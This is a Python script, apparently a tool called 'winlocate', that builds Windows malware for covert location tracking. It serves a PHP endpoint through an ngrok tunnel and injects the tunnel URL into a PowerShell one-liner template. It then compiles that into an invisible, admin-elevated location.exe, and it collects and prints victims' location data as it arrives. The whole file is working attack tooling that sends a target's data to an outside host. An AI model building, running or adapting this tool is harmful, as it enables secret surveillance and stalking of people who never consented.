from os import system
import shutil
from time import sleep
import re
import multiprocessing

RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
print(r"""
	
		  _       _                 _       
	__      _(_)_ __ | | ___   ___ __ _| |_ ___ 
	\ \ /\ / / | '_ \| |/ _ \ / __/ _` | __/ _ \
	 \ V  V /| | | | | | (_) | (_| (_| | ||  __/
	  \_/\_/ |_|_| |_|_|\___/ \___\__,_|\__\___|
	                                            

				       



""")

system('cp Template/get-location-oneliner.ps1 ./ > /dev/null')
system("rm location.loc 2> /dev/null")
system("touch location.loc")

print(GREEN + " [+] Starting php\n"+ DEFAULT)
def runServer():
    system("php -S 127.0.0.1:8080 > /dev/null 2>&1 &")



def ngrok():
    print(GREEN + " [+] Starting ngrok\n"+ DEFAULT)
    system("./ngrok http 8080 > /dev/null &")
    
    sleep(6)
    system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "http://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
    urlFile = open('ngrok.url', 'r')
    global url
    url = urlFile.read().rstrip("\n")
    urlFile.close()
    
        

def subst():           
    with open('get-location-oneliner.ps1', "r+") as ps1:
        s=ps1.read().rstrip("\n")
        ret = re.sub("ngrok_link", url, s)
        ps1.seek(0)
        ret.strip("\n")
        ps1.write(ret)
        


def compile():
    cmp = input(" [+] Windows system type you want to compile for x86/x64: ")
    if cmp == 'x64':
        print(GREEN + " [+] Compiling to exe\n" + DEFAULT)
        system("wine Ps1_To_Exe_x64.exe /ps1 get-location-oneliner.ps1 /exe location.exe /x64 /invisible /uac-admin")
        print(CYAN + " [+] Output file location.exe generated" + DEFAULT)
    elif cmp == 'x86':
        print(GREEN + " [+] Compiling to exe\n" + DEFAULT)
        system("wine Ps1_To_Exe.exe /ps1 get-location-oneliner.ps1 /exe location.exe /invisible /uac-admin")
        print(CYAN + " [+] Output file location.exe generated" + DEFAULT)
    else:
        compile()    

def getcords():
    print(GREEN + " [+] Waiting for location"+ DEFAULT)
    while True:
        
        with open('location.loc') as cords:
            lines = cords.read().rstrip()
            if len(lines) != 0:
                print(CYAN + "\n[*] Location received\n" + DEFAULT)
                system("cat location.loc")
                system("rm location.loc")
                system("touch location.loc") 

if __name__ == "__main__":
    try:
        runServer()
        ngrok()
        subst()
        compile()
        multiprocessing.Process(target=runServer).start()
        getcords()
    except KeyboardInterrupt:
        exit(0)
